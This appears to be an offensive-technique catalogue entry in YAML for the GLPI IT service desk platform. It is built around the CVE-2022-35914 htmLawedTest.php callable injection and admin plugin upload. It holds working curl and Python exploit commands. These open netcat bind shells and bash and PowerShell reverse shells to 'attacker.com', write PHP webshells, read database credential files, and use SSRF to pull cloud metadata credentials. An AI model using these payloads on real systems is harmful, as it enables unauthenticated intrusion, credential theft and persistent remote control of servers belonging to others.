---
comment: |
  GLPI is a PHP-based open-source IT asset management and service desk platform.

  CVE-2022-35914 (CVSS 9.8): Unauthenticated RCE via PHP code injection in the htmlLawed
  library bundled with GLPI. The file `/vendor/htmlawed/htmlawed/htmLawedTest.php` is a
  test script that should not be present in production. Its `hhook` parameter is passed
  directly to `call_user_func()`, allowing any PHP callable (system, passthru, exec,
  file_get_contents, file_put_contents) to be invoked with arbitrary arguments supplied
  via the `text` parameter. No authentication required. Affects GLPI 10.0.0 through 10.0.2.
  Fixed in GLPI 10.0.3 by removing the test file from the distribution.
  nuclei: CVE-2022-35914
  ExploitDB: 51102

  Admin plugin upload: GLPI administrators can install PHP plugins via
  Setup > Plugins. A minimal plugin (setup.php + arbitrary PHP files) is deployed to
  /plugins/ and served directly by the web server.
functions:
  bind-shell:
  - code: |
      # CVE-2022-35914: bind shell via proc_open callable (Linux)
      # The hhook parameter selects the PHP callable; text provides the argument.
      # proc_open is called with a crafted descriptor array for a bind shell.
      # Use the webshell entry to write a bind-shell PHP file instead for reliability.
      curl -s -X POST "http://victim.com/vendor/htmlawed/htmlawed/htmLawedTest.php" \
        --data-urlencode 'hhook=system' \
        --data-urlencode 'text=nc -lvp 12345 -e /bin/sh &' \
        --data-urlencode 'sid=1'
    comment: |
      CVE-2022-35914: invokes system() via call_user_func() to start netcat in listen
      mode as a background process. Requires nc with -e support on the target.
      Connect from the attacker with: nc victim.com 12345
      The sid parameter must be non-empty to pass htmLawedTest.php's input validation.
    connector: tcp-client
    contexts:
      unauthenticated:
    platform: linux
    tty: false
    version: |
      10.0.0 - 10.0.2 (before 10.0.3)
  file-read:
  - code: |
      # CVE-2022-35914: read an arbitrary file via file_get_contents callable
      curl -s -X POST "http://victim.com/vendor/htmlawed/htmlawed/htmLawedTest.php" \
        --data-urlencode 'hhook=file_get_contents' \
        --data-urlencode 'text=/etc/passwd' \
        --data-urlencode 'sid=1'

      # Useful target files:
      # /var/www/html/glpi/config/config_db.php  (database credentials)
      # /etc/glpi/config_db.php                  (alternate config location)
      # /etc/passwd
    comment: |
      CVE-2022-35914: file_get_contents() is passed directly to call_user_func() with
      the text parameter as its argument. The file contents appear in the HTML response
      body (search for the value between the textarea tags in the response).
      config_db.php contains the database hostname, name, username, and password.
    contexts:
      unauthenticated:
    version: |
      10.0.0 - 10.0.2 (before 10.0.3)
  file-write:
  - code: |
      # CVE-2022-35914: write arbitrary content via file_put_contents callable
      # file_put_contents(filename, data) - supply as JSON array in text parameter
      # call_user_func('file_put_contents', $text) won't accept two args directly;
      # use system() to invoke a shell command that writes the file instead:
      curl -s -X POST "http://victim.com/vendor/htmlawed/htmlawed/htmLawedTest.php" \
        --data-urlencode 'hhook=system' \
        --data-urlencode 'text=echo "<?php system(\$_GET[c]); ?>" > /var/www/html/glpi/shell.php' \
        --data-urlencode 'sid=1'

      # Verify the file was written:
      curl -s "http://victim.com/shell.php?c=id"
    comment: |
      CVE-2022-35914: uses system() to execute a shell command that writes a file.
      The echo payload writes a PHP webshell to the GLPI web root.
      The exact web root path depends on the installation; common locations:
        /var/www/html/glpi/
        /var/www/glpi/
        /usr/share/glpi/
      Use the file-read entry to read /etc/apache2/sites-enabled/ or /proc/1/cmdline
      to confirm the document root.
    contexts:
      unauthenticated:
    version: |
      10.0.0 - 10.0.2 (before 10.0.3)
  rce:
  - code: |
      # CVE-2022-35914: unauthenticated RCE via htmLawedTest.php callable injection
      curl -s -X POST "http://victim.com/vendor/htmlawed/htmlawed/htmLawedTest.php" \
        --data-urlencode 'hhook=passthru' \
        --data-urlencode 'text=id' \
        --data-urlencode 'sid=1'
    comment: |
      CVE-2022-35914: htmLawedTest.php passes the hhook parameter directly to
      call_user_func() and the text parameter as its argument. Using passthru() returns
      full command output inline in the HTML response body.
      The sid parameter must be present and non-empty to pass the script's validation.
      nuclei: CVE-2022-35914
      ExploitDB: 51102
    contexts:
      unauthenticated:
    version: |
      10.0.0 - 10.0.2 (before 10.0.3)
  - code: |
      # Admin plugin upload: deploy a PHP webshell as a GLPI plugin
      # 1. Create the plugin directory structure:
      mkdir -p /tmp/glpishell/glpishell
      cat > /tmp/glpishell/glpishell/setup.php <<'PHPEOF'
      <?php
      function plugin_version_glpishell() {
          return ['name' => 'Shell', 'version' => '1.0', 'author' => 'a',
                  'license' => 'MIT', 'homepage' => '', 'minGlpiVersion' => '10.0'];
      }
      function plugin_glpishell_check_prerequisites() { return true; }
      function plugin_glpishell_check_config() { return true; }
      PHPEOF
      cat > /tmp/glpishell/glpishell/shell.php <<'PHPEOF'
      <?php if(isset($_REQUEST['c'])){echo shell_exec($_REQUEST['c']);} ?>
      PHPEOF

      # 2. Create the plugin ZIP:
      cd /tmp/glpishell && zip -r glpishell.zip glpishell/

      # 3. Upload and install via Setup > Plugins > Upload plugin (admin session required):
      # Use the web UI or the API to upload glpishell.zip, then click Install + Enable.
      # 4. Access the webshell:
      curl "http://victim.com/plugins/glpishell/shell.php?c=id"
    comment: |
      GLPI administrators can install plugins as ZIP archives. The plugin is extracted
      to /plugins/ and PHP files are executed directly by the web server.
      No server restart is required - the plugin activates immediately after enabling.
      The setup.php file satisfies GLPI's plugin API requirements.
      Access at: http://victim.com/plugins/glpishell/shell.php?c=id
    contexts:
      admin:
      plugin:
  reverse-shell:
  - blind: true
    code: |
      # CVE-2022-35914: reverse bash shell (Linux)
      curl -s -X POST "http://victim.com/vendor/htmlawed/htmlawed/htmLawedTest.php" \
        --data-urlencode 'hhook=system' \
        --data-urlencode 'text=bash -c "bash -i >& /dev/tcp/attacker.com/12345 0>&1" &' \
        --data-urlencode 'sid=1'
    comment: |
      CVE-2022-35914: executes a bash reverse shell via system(). The trailing & runs
      it in the background so the HTTP response returns immediately.
      Check the listener for the incoming connection.
    contexts:
      unauthenticated:
    listener: tcp-server
    platform: linux
    tty: false
    version: |
      10.0.0 - 10.0.2 (before 10.0.3)
  - blind: true
    code: |
      # CVE-2022-35914: PowerShell reverse shell (Windows)
      python3 - <<'EOF'
      import urllib.parse, requests

      TARGET = "http://victim.com/vendor/htmlawed/htmlawed/htmLawedTest.php"
      LHOST  = "attacker.com"
      LPORT  = "12345"

      ps = (
          f'$c=New-Object Net.Sockets.TCPClient("{LHOST}",{LPORT});'
          '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};'
          'while(($i=$s.Read($b,0,$b.Length)) -ne 0){'
          '$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'
          '$r=(iex $d 2>&1|Out-String);'
          '$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}'
      )
      cmd = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "{ps}"'
      requests.post(TARGET, data={
          'hhook': 'system',
          'text': cmd,
          'sid': '1',
      })
      print(f"[*] Payload sent - check listener on {LHOST}:{LPORT}")
      EOF
    comment: |
      CVE-2022-35914 Windows variant: invokes system() to launch a hidden PowerShell
      reverse shell. The HTTP response returns immediately; check the listener.
    contexts:
      unauthenticated:
    listener: tcp-server
    platform: windows
    tty: false
    version: |
      10.0.0 - 10.0.2 (before 10.0.3)
  ssrf:
  - code: |
      # GLPI RSS feed feature: server-side URL fetch (admin)
      # GLPI's RSS feed widget fetches remote URLs server-side via SimplePie.
      # Navigate to: Central > Add a RSS feed widget
      # Set the URL to an internal resource or cloud metadata endpoint.
      # Alternatively, use the feed URL directly via the API:
      curl -s -b "$(python3 -c "
      import requests
      s=requests.Session()
      r=s.post('http://victim.com/front/login.php', data={
          'login':'glpi','password':'glpi','auth':'local'})
      print('; '.join(f'{c.name}={c.value}' for c in s.cookies))
      ")" \
        "http://victim.com/ajax/getRssList.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

      # Cloud metadata targets:
      # AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
      # GCP:        http://metadata.google.internal/computeMetadata/v1/
      # Azure:      http://169.254.169.254/metadata/instance?api-version=2021-02-01
    comment: |
      GLPI's RSS feed functionality fetches external URLs server-side, enabling SSRF
      to reach internal services and cloud metadata endpoints. Requires authenticated
      access. The response content is returned in the AJAX response body.
      If SimplePie parsing fails, the raw HTTP response body may still be reflected
      in error output depending on the GLPI version and configuration.
    contexts:
      admin:
      authenticated:
  webshell:
  - code: |
      # CVE-2022-35914: write a webshell via system() echo (no file_put_contents needed)
      curl -s -X POST "http://victim.com/vendor/htmlawed/htmlawed/htmLawedTest.php" \
        --data-urlencode 'hhook=system' \
        --data-urlencode 'text=echo "<?php if(isset(\$_REQUEST['"'"'c'"'"'])){echo shell_exec(\$_REQUEST['"'"'c'"'"']);}?>" > /var/www/html/glpi/shell.php' \
        --data-urlencode 'sid=1'

      # Verify:
      curl -s "http://victim.com/shell.php?c=id"
    comment: |
      CVE-2022-35914: writes a persistent PHP webshell to the GLPI web root using
      system() to invoke an echo shell command. Adjust the path to the actual document
      root of the target installation. The shell is accessible via direct HTTP request.
      Access at: http://victim.com/shell.php?c=id
    contexts:
      unauthenticated:
    version: |
      10.0.0 - 10.0.2 (before 10.0.3)
  - code: |
      # Admin plugin upload webshell (see rce entry for full packaging instructions)
      # Once the glpishell plugin is installed and enabled:
      curl "http://victim.com/plugins/glpishell/shell.php?c=id"
    comment: |
      Persistent PHP webshell deployed as a GLPI plugin. The plugin survives GLPI
      updates and remains active until explicitly uninstalled.
      See the rce (admin) entry for the full packaging and installation procedure.
    contexts:
      admin:
      plugin:
...
